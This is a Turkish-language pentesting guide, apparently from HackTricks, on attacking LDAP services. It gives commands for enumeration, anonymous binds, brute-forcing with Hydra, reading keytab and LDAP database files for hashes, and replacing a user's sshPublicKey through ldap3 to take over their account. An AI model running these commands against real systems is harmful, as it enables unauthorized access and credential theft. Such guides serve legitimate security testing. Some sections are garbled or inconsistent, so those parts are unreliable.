# 389, 636, 3268, 3269 - LDAP Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

**LDAP** (Hafif Dizin EriÅŸim ProtokolÃ¼) kullanÄ±mÄ± genellikle aÄŸlarda, hem genel hem de Ã¶zel, kuruluÅŸlarÄ±, bireyleri ve dosyalarÄ± ve cihazlarÄ± gibi Ã§eÅŸitli varlÄ±klarÄ± bulmak iÃ§in yapÄ±lmaktadÄ±r. Ã–nceki versiyonu olan DAP'a kÄ±yasla daha kÃ¼Ã§Ã¼k bir kod ayak izine sahip olmasÄ±yla daha optimize bir yaklaÅŸÄ±m sunar.

LDAP dizinleri, her birinin bir Dizin Sistemi AjanÄ± (DSA) olarak adlandÄ±rÄ±lan **Ã§oÄŸaltÄ±lmÄ±ÅŸ** ve **senkronize** bir sÃ¼rÃ¼mÃ¼nÃ¼ barÄ±ndÄ±ran birkaÃ§ sunucu Ã¼zerine daÄŸÄ±tÄ±lmasÄ±na izin vermek Ã¼zere yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r. Ä°stekleri iÅŸleme alma sorumluluÄŸu tamamen LDAP sunucusuna aittir ve gerektiÄŸinde diÄŸer DSAlarla iletiÅŸim kurarak isteÄŸi yapan kiÅŸiye birleÅŸik bir yanÄ±t sunabilir.

LDAP dizininin organizasyonu, **en Ã¼stteki kÃ¶k dizinle baÅŸlayan aÄŸaÃ§ hiyerarÅŸisine benzer**. Bu, Ã¼lkelerden baÅŸlayarak, daha sonra organizasyonlara ve ardÄ±ndan farklÄ± bÃ¶lÃ¼mleri veya departmanlarÄ± temsil eden organizasyon birimlerine ve son olarak insanlar ve dosyalar gibi paylaÅŸÄ±lan kaynaklarÄ± iÃ§eren bireysel varlÄ±k seviyesine kadar uzanÄ±r.

**VarsayÄ±lan port:** 389 ve 636 (ldaps). Global Catalog (ActiveDirectory'de LDAP) varsayÄ±lan olarak 3268 ve LDAPS iÃ§in 3269 portlarÄ±nda bulunmaktadÄ±r.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Veri DeÄŸiÅŸim FormatÄ±

LDIF (LDAP Veri DeÄŸiÅŸim FormatÄ±), dizin iÃ§eriÄŸini bir dizi kayÄ±t olarak tanÄ±mlar. AyrÄ±ca gÃ¼ncelleme isteklerini (Ekle, DeÄŸiÅŸtir, Sil, Yeniden AdlandÄ±r) temsil edebilir.
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* SatÄ±rlar 1-3 Ã¼st dÃ¼zey etki alanÄ±nÄ± local olarak tanÄ±mlar
* SatÄ±rlar 5-8 ilk dÃ¼zey etki alanÄ±nÄ± moneycorp (moneycorp.local) olarak tanÄ±mlar
* SatÄ±rlar 10-16 2 organizasyon birimini tanÄ±mlar: dev ve sales
* SatÄ±rlar 18-26 etki alanÄ± nesnesi oluÅŸturur ve deÄŸerlerle Ã¶znitelikler atar

## Veri Yaz

DeÄŸerleri deÄŸiÅŸtirebiliyorsanÄ±z gerÃ§ekten ilginÃ§ eylemler gerÃ§ekleÅŸtirebilirsiniz. Ã–rneÄŸin, **kullanÄ±cÄ±larÄ±n "sshPublicKey" bilgisini deÄŸiÅŸtirebileceÄŸinizi hayal edin**. Bu Ã¶znitelik varsa, **ssh'nin genel anahtarlarÄ± LDAP'den okuduÄŸu Ã§ok olasÄ±dÄ±r**. Bir kullanÄ±cÄ±nÄ±n genel anahtarÄ±nÄ± deÄŸiÅŸtirebilirseniz, **ssh'de parola kimlik doÄŸrulamasÄ± etkin deÄŸilse bile o kullanÄ±cÄ± olarak giriÅŸ yapabilirsiniz**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## AÃ§Ä±k metin kimlik bilgilerini izleme

EÄŸer LDAP SSL olmadan kullanÄ±lÄ±yorsa, aÄŸda **aÃ§Ä±k metin kimlik bilgilerini izleyebilirsiniz**.

AyrÄ±ca, aÄŸda **LDAP sunucusu ve istemci arasÄ±nda** bir **MITM** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz. Burada, istemcinin **aÃ§Ä±k metin kimlik bilgilerini** kullanarak giriÅŸ yapmasÄ±nÄ± saÄŸlayacak bir **Downgrade SaldÄ±rÄ±sÄ±** yapabilirsiniz.

**EÄŸer SSL kullanÄ±lÄ±yorsa**, yukarÄ±da bahsedildiÄŸi gibi bir **MITM** yapmaya Ã§alÄ±ÅŸabilirsiniz ancak **sahte bir sertifika sunarak**, eÄŸer **kullanÄ±cÄ± kabul ederse**, kimlik doÄŸrulama yÃ¶ntemini Downgrade edebilir ve kimlik bilgilerini tekrar gÃ¶rebilirsiniz.

## Anonim EriÅŸim

### TLS SNI kontrolÃ¼nÃ¼ atlatma

[**Bu yazÄ±da**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) belirtildiÄŸine gÃ¶re, LDAP sunucusuna rastgele bir alan adÄ±yla (Ã¶rneÄŸin company.com) eriÅŸerek, bir anonim kullanÄ±cÄ± olarak LDAP hizmetiyle iletiÅŸime geÃ§ebilmiÅŸ ve bilgi Ã§Ä±karabilmiÅŸtir:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonim baÄŸlantÄ±larÄ±

[LDAP anonim baÄŸlantÄ±larÄ±](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled), etki altÄ±ndaki **kimlik doÄŸrulamamÄ±ÅŸ saldÄ±rganlarÄ±n** alanÄ±ndan bilgi almasÄ±na izin verir, bÃ¶ylece kullanÄ±cÄ±larÄ±n, gruplarÄ±n, bilgisayarlarÄ±n, kullanÄ±cÄ± hesabÄ± Ã¶zniteliklerinin ve alan parola politikasÄ±nÄ±n tam listesini alabilirler. Bu bir **eski yapÄ±landÄ±rma**dÄ±r ve Windows Server 2003'ten itibaren yalnÄ±zca kimlik doÄŸrulamÄ±ÅŸ kullanÄ±cÄ±lara LDAP isteklerini baÅŸlatma izni verilir.\
Ancak, yÃ¶neticiler **anonim baÄŸlantÄ±lara izin vermek iÃ§in belirli bir uygulama kurmak zorunda kalmÄ±ÅŸ** olabilir ve istenenden fazla eriÅŸim vermiÅŸ olabilirler, bÃ¶ylece kimlik doÄŸrulamamÄ±ÅŸ kullanÄ±cÄ±larÄ±n AD'deki tÃ¼m nesnelere eriÅŸim saÄŸlamalarÄ±na izin vermiÅŸ olabilirler.

## GeÃ§erli Kimlik Bilgileri

EÄŸer LDAP sunucusuna giriÅŸ yapmak iÃ§in geÃ§erli kimlik bilgileriniz varsa, Alan YÃ¶neticisi hakkÄ±nda tÃ¼m bilgileri dÃ¶kÃ¼mleyebilirsiniz:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Kaba Kuvvet](../generic-methodologies-and-resources/brute-force.md#ldap)

## NumaralandÄ±rma

### Otomatik

Bu kullanarak **genel bilgileri** (alan adÄ± gibi)** gÃ¶rebileceksiniz:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Python ile LDAP numaralandÄ±rma</summary>

LDAP'yi **kimlik bilgileri olmadan veya kimlik bilgileri ile numaralandÄ±rmak iÃ§in python** kullanabilirsiniz: `pip3 install ldap3`

Ã–ncelikle **kimlik bilgileri olmadan** baÄŸlanmayÄ± deneyin:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
EÄŸer yanÄ±t `True` ise, Ã¶nceki Ã¶rnekte olduÄŸu gibi LDAP'in **ilginÃ§ verilerini** (Ã¶rneÄŸin **adlandÄ±rma baÄŸlamÄ±** veya **alan adÄ±**) sunucudan elde edebilirsiniz:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Bir kez adlandÄ±rma baÄŸlamÄ±nÄ±zÄ± aldÄ±ktan sonra daha heyecan verici sorgular yapabilirsiniz. Bu basit sorgu size dizindeki tÃ¼m nesneleri gÃ¶stermelidir:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Ya da tÃ¼m ldap'Ä± **boÅŸalt**:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</detaylar>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch), LDAP sorgularÄ±nÄ± kullanarak bir Windows etki alanÄ±ndan kullanÄ±cÄ±larÄ±, gruplarÄ± ve bilgisayarlarÄ± sÄ±ralamak iÃ§in yararlÄ± bir Python betiÄŸidir.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

BoÅŸ kimlik bilgilerini kontrol edin veya kimlik bilgilerinizin geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
EÄŸer "_baÄŸlantÄ± tamamlanmalÄ±dÄ±r_" ÅŸeklinde bir ÅŸey bulursanÄ±z, bu kimlik bilgilerinin yanlÄ±ÅŸ olduÄŸu anlamÄ±na gelir.

**Bir alan adÄ±ndan her ÅŸeyi** Ã§Ä±karabilirsiniz:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
### KullanÄ±cÄ±larÄ± Ã‡Ä±kartma

LDAP sunucularÄ±ndaki kullanÄ±cÄ±larÄ± Ã§Ä±kartmak iÃ§in `ldapsearch` aracÄ±nÄ± kullanabiliriz. AÅŸaÄŸÄ±daki komutu kullanarak tÃ¼m kullanÄ±cÄ±larÄ± listeleyebiliriz:

```bash
ldapsearch -x -h <LDAP_SERVER_IP> -b "dc=<DOMAIN_COMPONENT>,dc=<DOMAIN_COMPONENT>" "(objectClass=inetOrgPerson)"
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**BilgisayarlarÄ±** Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### Benim Bilgilerimi Ã‡Ä±kart

LDAP sunucularÄ± genellikle kullanÄ±cÄ± bilgilerini depolamak iÃ§in kullanÄ±lÄ±r. Bu bilgiler, kullanÄ±cÄ± adlarÄ±, ÅŸifreler, e-posta adresleri ve diÄŸer kimlik doÄŸrulama verilerini iÃ§erebilir. Bu bilgileri Ã§Ä±karmak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. **Sunucuyu Tarama**: LDAP sunucusunu taramak iÃ§in Ã§eÅŸitli araÃ§lar kullanÄ±n, Ã¶rneÄŸin `ldapsearch`.

2. **KullanÄ±cÄ± Bilgilerini Listeleme**: Tarama sonucunda elde ettiÄŸiniz bilgiler arasÄ±nda kullanÄ±cÄ± adlarÄ±, e-posta adresleri gibi bilgileri listeleyin.

3. **Bilgi Toplama**: KullanÄ±cÄ± adlarÄ± ve diÄŸer bilgileri hedefe yÃ¶nelik olarak toplayÄ±n.

4. **Kimlik DoÄŸrulama Bilgilerini Kullanma**: Elde ettiÄŸiniz bilgileri kimlik doÄŸrulama saldÄ±rÄ±larÄ± iÃ§in kullanabilirsiniz.

5. **Yetki YÃ¼kseltme**: Elde ettiÄŸiniz bilgileri kullanarak yetki yÃ¼kseltme saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirebilirsiniz.

Bu adÄ±mlarÄ± takip ederek LDAP sunucularÄ±ndan kullanÄ±cÄ± bilgilerini Ã§Ä±karabilir ve hedefe yÃ¶nelik saldÄ±rÄ±lar gerÃ§ekleÅŸtirebilirsiniz.
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Domain Admins**'Ä± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### **Domain KullanÄ±cÄ±larÄ±nÄ± Ã‡Ä±kartma:**

1. **ldapsearch** kullanarak tÃ¼m kullanÄ±cÄ±larÄ± Ã§Ä±karÄ±n:
   
    ```bash
    ldapsearch -x -h <LDAP_SERVER_IP> -b "dc=<DOMAIN>,dc=<COM>" -D "<LDAP_BIND_DN>" -w <PASSWORD> "(objectClass=user)"
    ```

2. **ldapsearch** ile sadece kullanÄ±cÄ± adlarÄ±nÄ± Ã§Ä±karÄ±n:

    ```bash
    ldapsearch -x -h <LDAP_SERVER_IP> -b "dc=<DOMAIN>,dc=<COM>" -D "<LDAP_BIND_DN>" -w <PASSWORD> "(objectClass=user)" sAMAccountName
    ```

3. **ldapsearch** ile kullanÄ±cÄ±larÄ±n ayrÄ±ntÄ±lÄ± bilgilerini Ã§Ä±karÄ±n:

    ```bash
    ldapsearch -x -h <LDAP_SERVER_IP> -b "dc=<DOMAIN>,dc=<COM>" -D "<LDAP_BIND_DN>" -w <PASSWORD> "(objectClass=user)" -LLL
    ```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### **Enterprise Admins** Grubunu Ã‡Ä±kartma:

```bash
ldapsearch -x -h <LDAP_SERVER_IP> -D "<LDAP_BIND_DN>" -w <PASSWORD> -b "cn=users,dc=<DOMAIN>,dc=<COM>" "(member=cn=Enterprise Admins,cn=users,dc=<DOMAIN>,dc=<COM>)"
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**YÃ¶neticileri** Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
### Uzak MasaÃ¼stÃ¼ Grubu Ã‡Ä±kartma:

```plaintext
ldapsearch -x -h <IP_ADDRESS> -b "dc=<DOMAIN>,dc=<COM>" -D "<USERNAME>" -w "<PASSWORD>" "(objectclass=group)" "Remote Desktop"
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
EÄŸer herhangi bir ÅŸifreye eriÅŸiminizin olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek istiyorsanÄ±z, sorgulardan birini Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra grep kullanabilirsiniz:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

**pbis**'i buradan indirebilirsiniz: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) ve genellikle `/opt/pbis` dizinine kurulur.\
**Pbis**, temel bilgilere kolayca eriÅŸmenizi saÄŸlar:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Grafik ArayÃ¼z

### Apache Directory

[**Apache Directory'yi buradan indirebilirsiniz**](https://directory.apache.org/studio/download/download-linux.html). Bu aracÄ± nasÄ±l kullanacaÄŸÄ±nÄ±za dair bir [Ã¶rneÄŸi burada bulabilirsiniz](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

LDAP sunucusu ile grafik arayÃ¼zÃ¼ indirebilirsiniz: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

VarsayÄ±lan olarak kurulu olduÄŸu dizin: _/opt/jxplorer_

![](<../.gitbook/assets/image (479).png>)

### Godap

[https://github.com/Macmod/godap](https://github.com/Macmod/godap) Ã¼zerinden eriÅŸebilirsiniz.

## Kerberos Ã¼zerinden Kimlik DoÄŸrulama

`ldapsearch` kullanarak **kerberos** Ã¼zerinden **kimlik doÄŸrulamasÄ±** yapabilirsiniz, bunun iÃ§in `-Y GSSAPI` parametresini kullanabilirsiniz.

## POST

VeritabanlarÄ±nÄ±n bulunduÄŸu dosyalara eriÅŸebiliyorsanÄ±z (genellikle _/var/lib/ldap_ iÃ§inde olabilir), hash'leri Ã§Ä±karabilirsiniz:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
### YapÄ±landÄ±rma DosyalarÄ±

* Genel
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 sunucusu
* V3.sas.oc
* Microsoft Active Directory sunucusu
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP dizin sunucusu
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarÄ±na katkÄ±da bulunun.**

</details>
